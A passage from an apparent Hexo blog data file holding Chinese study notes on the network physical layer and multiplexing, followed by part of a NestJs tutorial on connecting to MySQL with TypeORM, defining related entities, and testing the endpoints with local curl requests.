物理层作用\n计算机网络设备之间的连接必须依靠物理层的传输介质和相关协议进行。物理层主要负责在物理传输介质之上为“数据链路层”提供一个原始比特流（也就是数据是以一个个0或1的二进制代码形式表示的）的物理连接。其具体作用如下：\n\n* 构建数据通路\n“数据通路”就是完整的数据传输通道，可以是一段物理介质，也可以是由多段物理介质连接而成的。一次完整的数据传输，包括激活物理连接、传送数据、终止物理连接三个主要阶段。所谓“激活物理连接”，就是不管有多少段物理介质参与，在通信的两个数据终端设备间都要在电气上连接起来，形成一条可以在上面连续传输数据的通路。\n\n* 透明传输\n物理层中可用的传输介质类型（如不同类型的同轴电缆、双绞线和光纤等）非常多，各自又有相应的通信协议和标准来支持，这就决定了不同的计算机网络可能有不同的“路”。物理层除了要把这些不同的“路”修好外，还要确保这些不同的“路”能“连通”起来，形成通路，最终实现把比特流传输到对端“物理层”，然后向“数据链路层”提交的目的。\n\n* 要实现上述功能，需要物理层具有屏蔽不同传输介质类型和通信协议的功能，让进行网络通信的各方只看到有“路”可行，而不管修这些“路”所用的具体“材料”和相关标准，这就是物理层的“透明传输”功能。\n\n* 传输数据\n无论是从网络体系结构中哪层发起的通信，最终的数据都得通过最低的“物理层”传输出去，因为这是网络通信的唯一物理通道。但“物理层”的传输单位是比特（bit，也就是“位”，数据中的一个二进制的0或1就代表1位）。“物理层”的基本作用是在发送端通过物理层接口和传输介质将数据按比特流的顺序传送到接收端的物理层。\n\n* 数据编码\n要使数据能在“物理层”上有效、可靠地传输，最关键的是要确保数据比特流能在对应的“信道”中正常通过。这就涉及“物理层”的数据编码功能，因为不同传输介质所支持的数据编码类型不一样（如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等）。\n\n* 信道的极限容量\n任何信道中，码元的传输的速率是有上限的，传输的速率超过上限，就会出现严重的码建传绕问题，是的接受段对码元的判决成为不可能。因此有了香浓公式C = Wlog2(1+S/N);\n\n* 数据传输管理\n“物理层”还具有一定的数据传输管理功能，如基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。\n![computer_internet](computer_internet.png)\n#### 信道复用\n##### 频分复用（FDM）\n载波带宽(请注意，这里的“带宽”是频率带宽而不是数据的发送速率，每个子信道可以并行传送一路信号。FDM 用于模拟传输过程。\ne.g.——-广电HFC网络电视信号(FDM)\n```\nOFDM 正交频分复用\nOFDM系统比FDM系统要求的带宽要小得多,效率更高\ne.g.——-非对称的数字用户环线(ADSL)、数字视频广播(DVB)、高清晰度电视(HDTV)、无线局域网(WLAN)和第4代(4G)移动通信系统\n```\n#### 时分复用（TDM）\n在交互时间间隔内在同一信道上传送多路信号。TDM 广泛用于数字传输过程。\n可能造成线路浪费，TDM信号又称的等时信号。\ne.g.——–SDH（同步数字体系），ATM(异步传输模式)，IP和HFC网络中CM（电缆调制解调器）与CMTS（电缆调制解调器终端系统）的通信\n#### 波分复用（WDM）\n光的频分复用。在一根光纤上使用不同波长同时传送多路光波信号。WDM 用于光纤信道。WDM与FDM 基于相同原理但它应用于光纤信道的光波传输过程。\n\n#### 码分复用（CDM）\n每个信道作为编码信道实现位传输（特定脉冲序列）。这种编码传输方式通过传输唯一的时间系列短脉冲完成，但在较长的位时间中则采用时间片断替代。每个信道，都有各自的代码，并可以在同一光纤上进行传输以及异步解除复用。","slug":"computer-network-chapter2","published":1,"updated":"2021-09-11T05:43:19.652Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz05000t4jzx2pwqrrjj","content":"<ul><li><p>物理层概念<br>机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等等。<br>电气特性：指明在接口电缆的各条线上出现的电压的范围。<br>功能特性：指明某条线上出现的某一电平的电压表示何种意义。<br>过程特性：指明对于不同功能的各种可能事件的出现顺序。</p></li><li><p>物理层作用<br>计算机网络设备之间的连接必须依靠物理层的传输介质和相关协议进行。物理层主要负责在物理传输介质之上为“数据链路层”提供一个原始比特流（也就是数据是以一个个0或1的二进制代码形式表示的）的物理连接。其具体作用如下：</p></li><li><p>构建数据通路<br>“数据通路”就是完整的数据传输通道，可以是一段物理介质，也可以是由多段物理介质连接而成的。一次完整的数据传输，包括激活物理连接、传送数据、终止物理连接三个主要阶段。所谓“激活物理连接”，就是不管有多少段物理介质参与，在通信的两个数据终端设备间都要在电气上连接起来，形成一条可以在上面连续传输数据的通路。</p></li><li><p>透明传输<br>物理层中可用的传输介质类型（如不同类型的同轴电缆、双绞线和光纤等）非常多，各自又有相应的通信协议和标准来支持，这就决定了不同的计算机网络可能有不同的“路”。物理层除了要把这些不同的“路”修好外，还要确保这些不同的“路”能“连通”起来，形成通路，最终实现把比特流传输到对端“物理层”，然后向“数据链路层”提交的目的。</p></li><li><p>要实现上述功能，需要物理层具有屏蔽不同传输介质类型和通信协议的功能，让进行网络通信的各方只看到有“路”可行，而不管修这些“路”所用的具体“材料”和相关标准，这就是物理层的“透明传输”功能。</p></li><li><p>传输数据<br>无论是从网络体系结构中哪层发起的通信，最终的数据都得通过最低的“物理层”传输出去，因为这是网络通信的唯一物理通道。但“物理层”的传输单位是比特（bit，也就是“位”，数据中的一个二进制的0或1就代表1位）。“物理层”的基本作用是在发送端通过物理层接口和传输介质将数据按比特流的顺序传送到接收端的物理层。</p></li><li><p>数据编码<br>要使数据能在“物理层”上有效、可靠地传输，最关键的是要确保数据比特流能在对应的“信道”中正常通过。这就涉及“物理层”的数据编码功能，因为不同传输介质所支持的数据编码类型不一样（如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等）。</p></li><li><p>信道的极限容量<br>任何信道中，码元的传输的速率是有上限的，传输的速率超过上限，就会出现严重的码建传绕问题，是的接受段对码元的判决成为不可能。因此有了香浓公式C = Wlog2(1+S/N);</p></li><li><p>数据传输管理<br>“物理层”还具有一定的数据传输管理功能，如基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。<br><img src=\"/img/loading.gif\" data-original=\"/计算机网络/computer-network-chapter2/computer_internet.png\" alt=\"computer_internet\"></p><h4 id=\"信道复用\"><a href=\"#信道复用\" class=\"headerlink\" title=\"信道复用\"></a>信道复用</h4><h5 id=\"频分复用（FDM）\"><a href=\"#频分复用（FDM）\" class=\"headerlink\" title=\"频分复用（FDM）\"></a>频分复用（FDM）</h5><p>载波带宽(请注意，这里的“带宽”是频率带宽而不是数据的发送速率，每个子信道可以并行传送一路信号。FDM 用于模拟传输过程。<br>e.g.——-广电HFC网络电视信号(FDM)</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OFDM 正交频分复用</span><br><span class=\"line\">OFDM系统比FDM系统要求的带宽要小得多,效率更高</span><br><span class=\"line\">e.g.——-非对称的数字用户环线(ADSL)、数字视频广播(DVB)、高清晰度电视(HDTV)、无线局域网(WLAN)和第4代(4G)移动通信系统</span><br></pre></td></tr></table></figure></li></ul><h4 id=\"时分复用（TDM）\"><a href=\"#时分复用（TDM）\" class=\"headerlink\" title=\"时分复用（TDM）\"></a>时分复用（TDM）</h4><p>在交互时间间隔内在同一信道上传送多路信号。TDM 广泛用于数字传输过程。<br>可能造成线路浪费，TDM信号又称的等时信号。<br>e.g.——–SDH（同步数字体系），ATM(异步传输模式)，IP和HFC网络中CM（电缆调制解调器）与CMTS（电缆调制解调器终端系统）的通信</p><h4 id=\"波分复用（WDM）\"><a href=\"#波分复用（WDM）\" class=\"headerlink\" title=\"波分复用（WDM）\"></a>波分复用（WDM）</h4><p>光的频分复用。在一根光纤上使用不同波长同时传送多路光波信号。WDM 用于光纤信道。WDM与FDM 基于相同原理但它应用于光纤信道的光波传输过程。</p><h4 id=\"码分复用（CDM）\"><a href=\"#码分复用（CDM）\" class=\"headerlink\" title=\"码分复用（CDM）\"></a>码分复用（CDM）</h4><p>每个信道作为编码信道实现位传输（特定脉冲序列）。这种编码传输方式通过传输唯一的时间系列短脉冲完成，但在较长的位时间中则采用时间片断替代。每个信道，都有各自的代码，并可以在同一光纤上进行传输以及异步解除复用。</p>","site":{"data":{}},"excerpt":"","more":"<ul><li><p>物理层概念<br>机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等等。<br>电气特性：指明在接口电缆的各条线上出现的电压的范围。<br>功能特性：指明某条线上出现的某一电平的电压表示何种意义。<br>过程特性：指明对于不同功能的各种可能事件的出现顺序。</p></li><li><p>物理层作用<br>计算机网络设备之间的连接必须依靠物理层的传输介质和相关协议进行。物理层主要负责在物理传输介质之上为“数据链路层”提供一个原始比特流（也就是数据是以一个个0或1的二进制代码形式表示的）的物理连接。其具体作用如下：</p></li><li><p>构建数据通路<br>“数据通路”就是完整的数据传输通道，可以是一段物理介质，也可以是由多段物理介质连接而成的。一次完整的数据传输，包括激活物理连接、传送数据、终止物理连接三个主要阶段。所谓“激活物理连接”，就是不管有多少段物理介质参与，在通信的两个数据终端设备间都要在电气上连接起来，形成一条可以在上面连续传输数据的通路。</p></li><li><p>透明传输<br>物理层中可用的传输介质类型（如不同类型的同轴电缆、双绞线和光纤等）非常多，各自又有相应的通信协议和标准来支持，这就决定了不同的计算机网络可能有不同的“路”。物理层除了要把这些不同的“路”修好外，还要确保这些不同的“路”能“连通”起来，形成通路，最终实现把比特流传输到对端“物理层”，然后向“数据链路层”提交的目的。</p></li><li><p>要实现上述功能，需要物理层具有屏蔽不同传输介质类型和通信协议的功能，让进行网络通信的各方只看到有“路”可行，而不管修这些“路”所用的具体“材料”和相关标准，这就是物理层的“透明传输”功能。</p></li><li><p>传输数据<br>无论是从网络体系结构中哪层发起的通信，最终的数据都得通过最低的“物理层”传输出去，因为这是网络通信的唯一物理通道。但“物理层”的传输单位是比特（bit，也就是“位”，数据中的一个二进制的0或1就代表1位）。“物理层”的基本作用是在发送端通过物理层接口和传输介质将数据按比特流的顺序传送到接收端的物理层。</p></li><li><p>数据编码<br>要使数据能在“物理层”上有效、可靠地传输，最关键的是要确保数据比特流能在对应的“信道”中正常通过。这就涉及“物理层”的数据编码功能，因为不同传输介质所支持的数据编码类型不一样（如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等）。</p></li><li><p>信道的极限容量<br>任何信道中，码元的传输的速率是有上限的，传输的速率超过上限，就会出现严重的码建传绕问题，是的接受段对码元的判决成为不可能。因此有了香浓公式C = Wlog2(1+S/N);</p></li><li><p>数据传输管理<br>“物理层”还具有一定的数据传输管理功能，如基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。<br><img src=\"/计算机网络/computer-network-chapter2/computer_internet.png\" alt=\"computer_internet\"></p><h4 id=\"信道复用\"><a href=\"#信道复用\" class=\"headerlink\" title=\"信道复用\"></a>信道复用</h4><h5 id=\"频分复用（FDM）\"><a href=\"#频分复用（FDM）\" class=\"headerlink\" title=\"频分复用（FDM）\"></a>频分复用（FDM）</h5><p>载波带宽(请注意，这里的“带宽”是频率带宽而不是数据的发送速率，每个子信道可以并行传送一路信号。FDM 用于模拟传输过程。<br>e.g.——-广电HFC网络电视信号(FDM)</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OFDM 正交频分复用</span><br><span class=\"line\">OFDM系统比FDM系统要求的带宽要小得多,效率更高</span><br><span class=\"line\">e.g.——-非对称的数字用户环线(ADSL)、数字视频广播(DVB)、高清晰度电视(HDTV)、无线局域网(WLAN)和第4代(4G)移动通信系统</span><br></pre></td></tr></table></figure></li></ul><h4 id=\"时分复用（TDM）\"><a href=\"#时分复用（TDM）\" class=\"headerlink\" title=\"时分复用（TDM）\"></a>时分复用（TDM）</h4><p>在交互时间间隔内在同一信道上传送多路信号。TDM 广泛用于数字传输过程。<br>可能造成线路浪费，TDM信号又称的等时信号。<br>e.g.——–SDH（同步数字体系），ATM(异步传输模式)，IP和HFC网络中CM（电缆调制解调器）与CMTS（电缆调制解调器终端系统）的通信</p><h4 id=\"波分复用（WDM）\"><a href=\"#波分复用（WDM）\" class=\"headerlink\" title=\"波分复用（WDM）\"></a>波分复用（WDM）</h4><p>光的频分复用。在一根光纤上使用不同波长同时传送多路光波信号。WDM 用于光纤信道。WDM与FDM 基于相同原理但它应用于光纤信道的光波传输过程。</p><h4 id=\"码分复用（CDM）\"><a href=\"#码分复用（CDM）\" class=\"headerlink\" title=\"码分复用（CDM）\"></a>码分复用（CDM）</h4><p>每个信道作为编码信道实现位传输（特定脉冲序列）。这种编码传输方式通过传输唯一的时间系列短脉冲完成，但在较长的位时间中则采用时间片断替代。每个信道，都有各自的代码，并可以在同一光纤上进行传输以及异步解除复用。</p>"},{"title":"NestJs 入门教程之三：数据库","date":"2021-09-12T09:16:56.000Z","dir":"nestJs","keywords":"NestJs 教程","_content":"![nestjs](nestjs.png)\n\n这个系列的{% post_link nest-js-tutorial-2 上一篇 %}文章，实现了 `Post` 接口和对接口的基础操作。\n\n而真正的服务往往包括数据存储。\n\n本篇将介绍如何建立 NestJs 的数据库连接、并使用数据库联表查询。这样就就是完整的后台服务了。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n\n本篇使用 `mysql` 作为数据库连接。使用 `NestJs` 内置的[数据库连接](https://docs.nestjs.com/techniques/database) `typeorm`，可在 [这里](https://typeorm.io/) 查阅 typeorm 详细文档\n\n# 一、开发准备\n1. [下载](https://dev.mysql.com/downloads/mysql/)并安装 Mysql\n2. 创建 school 库\n```bash\ncreate database school;\n```\n3. 安装 @nestjs/typeorm typeorm mysql2\n```bash\nnpm install --save @nestjs/typeorm typeorm mysql2\n```\n\n# 二、数据库连接\n```typescript\n// app.module.ts\nimport { Module } from '@nestjs/common';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { StudentsController } from './students/students.controller';\nimport { TypeOrmModule } from '@nestjs/typeorm';\n\n@Module({\n  imports: [\n    StudentsModule,\n    TypeOrmModule.forRoot({\n      type: 'mysql',\n      host: '127.0.0.1',\n      port: 3306,\n      username: 'root',\n      password: '1qaz2wsx',\n      database: 'school',\n      autoLoadEntities: true,\n      synchronize: true, // 数据库自动同步 entity 文件修改\n    }),\n  ],\n  controllers: [AppController],\n  providers: [AppService],\n})\nexport class AppModule {}\n\n```\n初始化数据库连接。\n\n`autoLoadEntities` 自动化 load entity 文件, \b\b所有在 Module 中引用的 Entity 文件会被自动加载。自动加载设置为 true 即可。\n\n`synchronize` 自动化同步表，本地可自动打开，线上数据库不建议打开。\n\n# 三、定义表结构\n```typescript\nimport {\n    Entity,\n    Column,\n    PrimaryGeneratedColumn,\n    UpdateDateColumn,\n    CreateDateColumn,\n} from 'typeorm';\n\n@Entity()\nexport class Student {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'varchar' })\n  name: string;\n\n  @UpdateDateColumn()\n  updateDate: Date;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n- `@Entity` 注解代表是数据库入口文件；\n- `@Column` 是基础列文件，使用 `type` 字段定义在数据库实际存储\n- `@PrimaryGeneratedColumn` 代表单调递增的主键\n- `@UpdateDateColumn`\b 当记录修改时会修改时间\n- `@CreateDateColumn`\b 当记录新增时会写入时间\n\n# 四、引用表\n```typescript\n// students.module.ts\nimport { Module } from '@nestjs/common';\nimport { Student } from './entities/students.entity';\nimport { TypeOrmModule } from '@nestjs/typeorm';\nimport { StudentsController } from './students.controller';\nimport { StudentsService } from './students.service';\n\n@Module({\n    imports: [TypeOrmModule.forFeature([Student])],\n    providers: [StudentsService, Student],\n    controllers: [StudentsController],\n})\nexport class StudentsModule {}\n```\n- `imports` 引用 typeorm 模块， entity 才可以在 service 中使用\n- `providers` service 的 constructor 需要引用哪些模块\n- `controllers` 模块的 controller\n\n```typescript\n// students.service.ts\nimport { Injectable, Logger } from '@nestjs/common';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { Student } from './entities/students.entity';\n\n@Injectable()\nexport class StudentsService {\n    constructor(\n        @InjectRepository(Student)\n        private readonly studentRepository: Repository<Student>,\n    ) {}\n}\n```\n\n这样会在 db 中建立 students 新表。\n\n使用 `show create table` 能看表的详细信息。\n\n```mysql\nuse school;\n\nshow tables;\n\n// => | student | CREATE TABLE `student` (\n//  `id` int NOT NULL AUTO_INCREMENT,\n//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//  `name` varchar(255) NOT NULL,\n//  PRIMARY KEY (`id`)\n// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |\n```\n\n# 五、与数据库交互\n到这一步，终于可以和数据库进行交互了。基本上和数据库交互的部分都会放在 service 层，因此 `新增` 和 `查询` 都放在 service 层。\n\n其中包括了\n\n- `getStudentName` 的改造\n- `setStudent` 函数的新增\n\n```ts\n// students.service.ts\n// import ...\n\n@Injectable()\nexport class StudentsService {\n    // logger, constructor ImStudent getStudentName ...\n\n    async getStudentName(id: number) {\n        this.logger.log(`get student id is ${id}`);\n        const results = await this.studentRepository.find({ id });\n\n        return results ?? 'not found';\n    }\n\n    async setStudent(name: string) {\n        const results = this.studentRepository.create({ name });\n        return results;\n    }\n}\n\n```\n\n通过使用 `find` 和 `create` 对学生查询和创建。结果也是异步的。\n\n下面对 `controller` 进行改造，使得函数调用串起来。\n\n```ts\n// students.controller.ts\n// import ...\n@Controller('students')\nexport class StudentsController {\n    // constructor whoAreYou whoAreYouPost whoIsReq ..\n\n    @Get('get-name-by-id')\n    getNameById(@Query('id', ParseIntPipe) id: number) {\n        return this.studentsService.getStudentName(id);\n    }\n\n    @Post('set-student-name')\n    setStudentName(@User() user: string) {\n        return this.studentsService.setStudent(user);\n    }\n}\n```\n通过对 `service` 的调用, 再经 `controller` 调用产生如下结果\n\n```bash\n// ✅ 命令行访问\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => {\"name\":\"gdccwxx\",\"id\":1,\"updateDate\":\"2021-09-12T15:57:14.599Z\",\"createDate\":\"2021-09-12T15:57:14.599Z\"}%\n\n// ✅ 浏览器访问\nhttp://localhost:3000/students/get-name-by-id?id=1\n\n// => [{\n//  id: 1,\n//  name: \"gdccwxx\",\n//  updateDate: \"2021-09-12T15:57:14.599Z\",\n//  createDate: \"2021-09-12T15:57:14.599Z\"\n// }]\n```\n\n通过对 `service` 的 save、find 调用，就能将数据完整存入数据库了。\n\n# 六、联表查询\n我们准备新建课程表`class`，每个班级可以有多个学生，一个学生隶属一个班级。\n\n这样`学生`和`班级`就构成了 `n:1` 的关系。\n\n为了方便展示，在学生模块下直接新增 `class.entity.ts` 文件。并通过 `@OneToMany` 关联 `students`。\n\n```ts\n// classes.entity.ts\nimport { Entity, Column, PrimaryGeneratedColumn, UpdateDateColumn, CreateDateColumn, OneToMany } from 'typeorm';\nimport { Student } from './students.entity';\n\n@Entity()\nexport class Classes {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'varchar' })\n  className: string;\n\n  @OneToMany(() => Student, student => student.class)\n  students: Student[]\n\n  @UpdateDateColumn()\n  updateDate: Date;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n同时修改 `students.entity.ts`, 通过 `@ManyToOne` 引入 `Classes` 修改\n\n```ts\n// students.entity.ts\nimport {\n    ManyToOne,\n    // Entity...\n} from 'typeorm';\nimport { Classes } from './classes.entity';\n\n@Entity()\nexport class Student {\n  // id name updateDate, createDate...\n  @ManyToOne(() => Classes, classes => classes.students)\n  class: Classes;\n}\n```\n\n注意：`classes` 表引用 `students` 是通过新建字段(`students\\class`)进行关联。\n\n引用会最终在数据库变成`外键`连接。\n\n```bash\nshow create table student;\n// =>  CREATE TABLE `student` (\n//   `id` int NOT NULL AUTO_INCREMENT,\n//   `name` varchar(255) NOT NULL,\n//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//   `classId` int DEFAULT NULL,    // 👈 注意这里\n//   PRIMARY KEY (`id`),\n//   KEY `FK_bd5c8f2ef67394162384a484ba1` (`classId`), // 👈 注意这里\n//   CONSTRAINT `FK_bd5c8f2ef67394162384a484ba1` FOREIGN KEY (`classId`) REFERENCES `classes` (`id`) // 👈 注意这里\n// ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n\n\n// 而 classes 表并无链接\nshow create table classes;\n// CREATE TABLE `classes` (\n//   `id` int NOT NULL AUTO_INCREMENT,\n//   `className` varchar(255) NOT NULL,\n//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//   PRIMARY KEY (`id`)\n// ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n```\n\n再引入表，详细操作可看第四步。\n\n\n`students.module.ts` 引入表\n```ts\n// students.module.ts\nimport { Classes } from './entities/classes.entity';\n// ...\n\n@Module({\n    imports: [TypeOrmModule.forFeature([Student, Classes])],\n    providers: [StudentsService, Student, Classes],\n    // ..\n})\nexport class StudentsModule {}\n\n```\n\n\n`students.service.ts` 引入表, 并实现 `setClass`, `getClass` 方法\n\n```ts\nimport { Classes } from './entities/classes.entity';\n\n@Injectable()\nexport class StudentsService {\n    constructor(\n        @InjectRepository(Student)\n        private readonly studentRepository: Repository<Student>,\n        @InjectRepository(Classes)\n        private readonly classRepository: Repository<Classes>,\n    ) {}\n    // ...\n     async setClass(name: string, studentIds: number[]) {\n        const students = await this.studentRepository.find({ where: studentIds });\n        const result = await this.classRepository.save({\n            className: name,\n            students: students, // 此处直接保存students 的实例，即直接从数据库取出来的数据\n        })\n        return result;\n    }\n    async findClass(id: number) {\n        const result = await this.classRepository.find({\n            where: { id },\n            relations: ['students']\n        });\n        return result;\n    }\n}\n```\n\n新增 `ClassesDto`\n```ts\n// classes.dto.ts\nimport { IsNotEmpty, IsString } from 'class-validator';\n\nexport class ClassesDto {\n    @IsNotEmpty()\n    @IsString()\n    className: string;\n\n    students: number[]\n}\n```\n\n\n`students.controller.ts` 修改\n```typescript\n// students.controller.ts\n// import ...\nexport class StudentsController {\n    // constructor ...\n\n    @Get('get-class')\n    getClass(@Query('id', ParseIntPipe) id: number) {\n        return this.studentsService.findClass(id);\n    }\n\n    @Post('set-class')\n    setClass(@Body() classes: ClassesDto) {\n        return this.studentsService.setClass(classes.className, classes.students);\n    }\n}\n\n```\n\n`调用接口`，先插入数据再查询数据。\n\n```bash\n// 再新增一条数据\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx1\"}'\n\n// 插入 classes 数据\ncurl -X POST http://127.0.0.1:3000/students/set-class -H 'Content-Type: application/json' -d '{\"className\": \"blog\", \"students\": [1,2]}'\n\n// ✅ 通过浏览器，查询长啥样\nhttp://localhost:3000/students/get-class?id=1\n// => [{\n//  id: 1,\n    className: \"blog\",\n    updateDate: \"2021-09-15T01:05:38.055Z\",\n    createDate: \"2021-09-15T01:05:38.055Z\",\n    students: [{\n        id: 1,\n        name: \"gdccwxx\",\n        updateDate: \"2021-09-15T01:05:38.000Z\",\n        createDate: \"2021-09-15T01:05:23.988Z\"\n    },{\n        id: 2,\n        name: \"gdccwxx1\",\n        updateDate: \"2021-09-15T01:05:38.000Z\",\n        createDate: \"2021-09-15T01:05:28.084Z\"\n    }]\n}]\n```\n\n\n# 七、简单回顾\n再回顾下本章：\n- 使用 `typeorm` 和 `mysql` 建立连接\n- 使用 `entity` 文件创建数据库表\n- `service` 使用对数据库的简单调用，包括`写入`和`读取`\n- 使用关系查询，将 `student` 和 `classes` 连接写入和查询\n\n至此，我们使用 `typeorm` 和 `mysql` 连接数据库就完成了。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n{% post_link nest-js-tutorial-4 下章 %}我们将主要讲 `NestJs` 的高级用法，包括 `管道`、`守卫`和`拦截器`。期待你的阅读。\n","source":"_posts/nest-js-tutorial-3.md","raw":"---\ntitle: NestJs 入门教程之三：数据库\ndate: 2021-09-12 17:16:56\ntags:\n    - javascript\n    - typescript\n    - nestJs\ndir: nestJs\nkeywords: NestJs 教程\n---\n![nestjs](nestjs.png)\n\n这个系列的{% post_link nest-js-tutorial-2 上一篇 %}文章，实现了 `Post` 接口和对接口的基础操作。\n\n而真正的服务往往包括数据存储。\n\n本篇将介绍如何建立 NestJs 的数据库连接、并使用数据库联表查询。这样就就是完整的后台服务了。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到。\n\n\n本篇使用 `mysql` 作为数据库连接。使用 `NestJs` 内置的[数据库连接](https://docs.nestjs.com/techniques/database) `typeorm`，可在 [这里](https://typeorm.io/) 查阅 typeorm 详细文档\n\n# 一、开发准备\n1. [下载](https://dev.mysql.com/downloads/mysql/)并安装 Mysql\n2. 创建 school 库\n```bash\ncreate database school;\n```\n3. 安装 @nestjs/typeorm typeorm mysql2\n```bash\nnpm install --save @nestjs/typeorm typeorm mysql2\n```\n\n# 二、数据库连接\n```typescript\n// app.module.ts\nimport { Module } from '@nestjs/common';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { StudentsController } from './students/students.controller';\nimport { TypeOrmModule } from '@nestjs/typeorm';\n\n@Module({\n  imports: [\n    StudentsModule,\n    TypeOrmModule.forRoot({\n      type: 'mysql',\n      host: '127.0.0.1',\n      port: 3306,\n      username: 'root',\n      password: '1qaz2wsx',\n      database: 'school',\n      autoLoadEntities: true,\n      synchronize: true, // 数据库自动同步 entity 文件修改\n    }),\n  ],\n  controllers: [AppController],\n  providers: [AppService],\n})\nexport class AppModule {}\n\n```\n初始化数据库连接。\n\n`autoLoadEntities` 自动化 load entity 文件, \b\b所有在 Module 中引用的 Entity 文件会被自动加载。自动加载设置为 true 即可。\n\n`synchronize` 自动化同步表，本地可自动打开，线上数据库不建议打开。\n\n# 三、定义表结构\n```typescript\nimport {\n    Entity,\n    Column,\n    PrimaryGeneratedColumn,\n    UpdateDateColumn,\n    CreateDateColumn,\n} from 'typeorm';\n\n@Entity()\nexport class Student {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'varchar' })\n  name: string;\n\n  @UpdateDateColumn()\n  updateDate: Date;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n- `@Entity` 注解代表是数据库入口文件；\n- `@Column` 是基础列文件，使用 `type` 字段定义在数据库实际存储\n- `@PrimaryGeneratedColumn` 代表单调递增的主键\n- `@UpdateDateColumn`\b 当记录修改时会修改时间\n- `@CreateDateColumn`\b 当记录新增时会写入时间\n\n# 四、引用表\n```typescript\n// students.module.ts\nimport { Module } from '@nestjs/common';\nimport { Student } from './entities/students.entity';\nimport { TypeOrmModule } from '@nestjs/typeorm';\nimport { StudentsController } from './students.controller';\nimport { StudentsService } from './students.service';\n\n@Module({\n    imports: [TypeOrmModule.forFeature([Student])],\n    providers: [StudentsService, Student],\n    controllers: [StudentsController],\n})\nexport class StudentsModule {}\n```\n- `imports` 引用 typeorm 模块， entity 才可以在 service 中使用\n- `providers` service 的 constructor 需要引用哪些模块\n- `controllers` 模块的 controller\n\n```typescript\n// students.service.ts\nimport { Injectable, Logger } from '@nestjs/common';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { Student } from './entities/students.entity';\n\n@Injectable()\nexport class StudentsService {\n    constructor(\n        @InjectRepository(Student)\n        private readonly studentRepository: Repository<Student>,\n    ) {}\n}\n```\n\n这样会在 db 中建立 students 新表。\n\n使用 `show create table` 能看表的详细信息。\n\n```mysql\nuse school;\n\nshow tables;\n\n// => | student | CREATE TABLE `student` (\n//  `id` int NOT NULL AUTO_INCREMENT,\n//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),\n//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),\n//  `name` varchar(255) NOT NULL,\n//  PRIMARY KEY (`id`)\n// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |\n```\n\n# 五、与数据库交互\n到这一步，终于可以和数据库进行交互了。基本上和数据库交互的部分都会放在 service 层，因此 `新增` 和 `查询` 都放在 service 层。\n\n其中包括了\n\n- `getStudentName` 的改造\n- `setStudent` 函数的新增\n\n```ts\n// students.service.ts\n// import ...\n\n@Injectable()\nexport class StudentsService {\n    // logger, constructor ImStudent getStudentName ...\n\n    async getStudentName(id: number) {\n        this.logger.log(`get student id is ${id}`);\n        const results = await this.studentRepository.find({ id });\n\n        return results ?? 'not found';\n    }\n\n    async setStudent(name: string) {\n        const results = this.studentRepository.create({ name });\n        return results;\n    }\n}\n\n```\n\n通过使用 `find` 和 `create` 对学生查询和创建。结果也是异步的。\n\n下面对 `controller` 进行改造，使得函数调用串起来。\n\n```ts\n// students.controller.ts\n// import ...\n@Controller('students')\nexport class StudentsController {\n    // constructor whoAreYou whoAreYouPost whoIsReq ..\n\n    @Get('get-name-by-id')\n    getNameById(@Query('id', ParseIntPipe) 